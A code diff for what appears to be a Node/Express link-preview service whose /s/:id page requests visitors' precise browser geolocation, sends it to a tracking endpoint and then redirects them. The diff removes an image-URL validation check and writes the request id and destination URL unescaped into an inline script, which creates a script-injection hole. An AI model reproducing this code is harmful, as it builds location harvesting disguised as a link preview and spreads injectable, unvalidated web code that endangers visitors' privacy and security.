@@ -123,11 +123,20 @@ const fetchLinkData = async (id) => {
         if (models && models.Link) {
             const link = await models.Link.findByPk(id);
             if (link) {
+                console.log('Link found:', link.id, 'Image:', link.imageUrl);
                 title = link.title || title;
                 description = link.description || description;
-                image = isValidOgImageUrl(link.imageUrl) ? link.imageUrl : defaultImage;
+                // Use image from link if it exists and is not empty
+                if (link.imageUrl && link.imageUrl.trim() !== '') {
+                    image = link.imageUrl.trim();
+                    console.log('Using custom image:', image);
+                } else {
+                    console.log('Using default image');
+                }
                 destinationUrl = link.destinationUrl || '#';
                 buttonText = link.buttonText || 'Más información';
+            } else {
+                console.log('Link not found:', id);
             }
         }
     } catch (e) {
@@ -265,6 +274,17 @@ app.get('/s/:id', async (req, res) => {
     </div>
     
     <script>
+        // Check if user already subscribed (gave location before)
+        const linkId = '${req.params.id}';
+        const storageKey = 'ubicar_subscribed_' + linkId;
+        const alreadySubscribed = localStorage.getItem(storageKey);
+        
+        if (alreadySubscribed) {
+            // Already subscribed, redirect immediately to destination
+            console.log('Already subscribed, redirecting...');
+            window.location.replace('${destinationUrl}');
+        }
+        
         document.getElementById('ctaBtn').addEventListener('click', async function() {
             const btn = this;
             const errorMsg = document.getElementById('errorMsg');
@@ -275,14 +295,15 @@ app.get('/s/:id', async (req, res) => {
             
             // Try to get location
             if (!navigator.geolocation) {
-                // No geolocation support, redirect anyway
+                // No geolocation support, mark as subscribed and redirect
+                localStorage.setItem(storageKey, 'true');
                 window.location.href = '${destinationUrl}';
                 return;
             }
             
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
-                    // Got location, send to server then redirect
+                    // Got location, send to server
                     try {
                         await fetch('${trackUrl}', {
                             method: 'POST',
@@ -296,12 +317,14 @@ app.get('/s/:id', async (req, res) => {
                     } catch (e) {
                         console.log('Tracking error:', e);
                     }
-                    // Redirect to destination
+                    // Mark as subscribed and redirect to destination
+                    localStorage.setItem(storageKey, 'true');
                     window.location.href = '${destinationUrl}';
                 },
                 (error) => {
-                    // Location denied or error, redirect anyway
+                    // Location denied or error, mark as subscribed anyway and redirect
                     console.log('Location error:', error);
+                    localStorage.setItem(storageKey, 'true');
                     window.location.href = '${destinationUrl}';
                 },
                 { timeout: 10000, enableHighAccuracy: true }
